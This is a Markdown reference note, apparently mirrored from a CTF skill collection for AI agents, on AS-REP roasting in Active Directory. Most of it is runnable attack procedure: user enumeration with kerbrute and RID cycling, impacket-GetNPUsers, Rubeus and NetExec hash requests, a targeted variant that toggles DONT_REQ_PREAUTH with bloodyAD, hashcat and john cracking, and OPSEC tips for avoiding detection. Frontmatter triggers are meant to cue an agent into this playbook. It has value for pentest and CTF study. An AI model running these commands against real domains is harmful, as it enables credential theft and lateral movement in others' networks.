# AS-REP Roasting

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/active-directory/asreproasting.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/active-directory/asreproasting.md)

---

---
name: asreproasting
category: active-directory
triggers: ["asreproast", "AS-REP", "AS-REP roasting", "GetNPUsers", "DONT_REQ_PREAUTH", "no preauth", "hashcat 18200", "krb5asrep", "preauth disabled"]
tools: ["impacket-GetNPUsers", "netexec/nxc", "Rubeus", "kerbrute", "hashcat", "john"]
priority: high
description: Recover crackable AS-REP hashes from accounts that have Kerberos pre-authentication disabled, often with no credentials required.
---
# AS-REP Roasting

## Trigger context
Accounts with `DONT_REQ_PREAUTH` (UF_DONT_REQUIRE_PREAUTH) set let anyone request an AS-REP without proving knowledge of the password. The AS-REP contains data encrypted with the account's key, crackable offline. Works with NO credentials if you have a username list; even better with creds to enumerate the flag across the domain.

## Objective
Find accounts with pre-auth disabled, request their AS-REP, and crack it offline (hashcat mode 18200) to recover the account's plaintext password.

## Methodology (decision tree)
```
Do you have valid domain creds?
├── YES → GetNPUsers with creds → LDAP query finds ALL preauth-disabled accounts → roast
└── NO  → Do you have a username list? (RID cycling / kerbrute / OSINT)
          ├── YES → GetNPUsers -usersfile users.txt -no-pass → roast whoever is vulnerable
          └── NO  → get a user list first (ad-enum-bloodhound.md), or fall back to spray
Cracked?
├── YES → new creds → re-run BloodHound / try kerberoasting / lateral movement
└── NO  → move to kerberoasting or coercion paths
```

## Commands & payloads
```bash
# --- No creds: test a user list (accounts WITH preauth just error, harmless) ---
impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip DC_IP

# --- With valid creds: enumerate + request all vulnerable accounts ---
impacket-GetNPUsers corp.local/jdoe:'Passw0rd!' -request -format hashcat -outputfile asrep.hashes -dc-ip DC_IP

# --- Single known target, no creds ---
impacket-GetNPUsers corp.local/svc_backup -no-pass -format hashcat -dc-ip DC_IP

# --- NetExec module (needs creds; queries LDAP for the flag then roasts) ---
nxc ldap DC_IP -u jdoe -p 'Passw0rd!' --asreproast asrep.hashes

# --- Generate a user list first if you lack one ---
nxc smb DC_IP -u 'guest' -p '' --rid-brute 10000 | grep SidTypeUser
kerbrute userenum -d corp.local --dc DC_IP users.txt

# --- Crack (Kerberos 5 AS-REP etype 23 / RC4-HMAC) ---
hashcat -m 18200 -a 0 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hashes rockyou.txt -r /usr/share/hashcat/rules/best64.rule
john --format=krb5asrep --wordlist=rockyou.txt asrep.hashes
```

Windows equivalents:
```powershell
# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
Rubeus.exe asreproast /user:svc_backup /format:hashcat
# PowerView: find the flag
Get-DomainUser -PreauthNotRequired | select samaccountname
```

Targeted AS-REP roasting (you have GenericWrite/GenericAll over a victim, BloodHound edge):
```bash
# Flip DONT_REQ_PREAUTH on the victim, roast, then restore
bloodyAD -d corp.local -u jdoe -p 'Passw0rd!' --host DC_IP add uac victimuser -f DONT_REQ_PREAUTH
impacket-GetNPUsers corp.local/ -no-pass -usersfile <(echo victimuser) -format hashcat -dc-ip DC_IP
bloodyAD -d corp.local -u jdoe -p 'Passw0rd!' --host DC_IP remove uac victimuser -f DONT_REQ_PREAUTH
```

Building the user list (prerequisite when you have no creds):
```bash
# from RID cycling (null/guest session)
nxc smb DC_IP -u 'guest' -p '' --rid-brute 10000 | grep -oP '\\\\K[^ ]+' > users.txt
# from kerbrute (validates existence, no lockout)
kerbrute userenum -d corp.local --dc DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
# from LDAP anonymous bind
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName
```

## Branching logic
- Hash format `$krb5asrep$23$...` -> hashcat mode 18200 (RC4). AES AS-REP (etype 17/18) is rare; use 18200 only for etype 23.
- No creds + user list -> use `-no-pass`; only preauth-disabled users return a hash, the rest just print "doesn't have UF_DONT_REQUIRE_PREAUTH set" (expected, not an error).
- Cracked -> pivot to [sa--instructions--active-directory--kerberoasting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--kerberoasting.md) (now you can enumerate SPNs authenticated) and re-run BloodHound as the new principal.
- Have write access but no naturally-vulnerable account -> targeted AS-REP roasting (flip the flag, roast, restore).

## Common pitfalls
- Clock skew breaks the AS exchange -> sync to DC before running.
- Wrong `-format` (default is john-ish); pass `-format hashcat` for `-m 18200`.
- `-usersfile` must be bare `sAMAccountName` per line, no domain prefix.
- Requesting is logged as Event 4768 with preauth type 0 — noisy if you enumerate many; single-target is quieter.
- AS-REP roasting only helps if such accounts exist; absence is common in hardened domains — don't burn time, pivot.

OPSEC / detection notes:
- Requests appear as Event 4768 with pre-auth type 0; a burst across many users is a strong detection signal.
- Single-target `-no-pass` requests are quiet; mass roasting of a full user list is not.
- No naturally-vulnerable accounts is common in hardened domains — don't over-invest; pivot to spraying/coercion.

## Proof / verification
- `hashcat -m 18200 asrep.hashes --show` reveals plaintext.
- Confirm: `nxc smb DC_IP -u svc_backup -p 'CrackedPass'` -> `[+]`.

## Cross-references
- [sa--instructions--active-directory--ad-enum-bloodhound.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--ad-enum-bloodhound.md) — build the user list (RID cycling / kerbrute) and analyze the cracked account.
- [sa--instructions--active-directory--kerberoasting.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--kerberoasting.md) — the with-creds sibling; run it next once you have a password.
- [sa--instructions--active-directory--pth-ptt-lateral.md](https://raw.githubusercontent.com/BigBread57/zametki/main/06-active-directory/sa--instructions--active-directory--pth-ptt-lateral.md) — reuse recovered credentials.

## Credible sources
- https://www.thehacker.recipes/ad/movement/kerberos/asreproast
- https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html
- https://www.netexec.wiki/ldap-protocol/asreproasting
- https://hashcat.net/wiki/doku.php?id=example_hashes
- https://github.com/GhostPack/Rubeus#asreproast
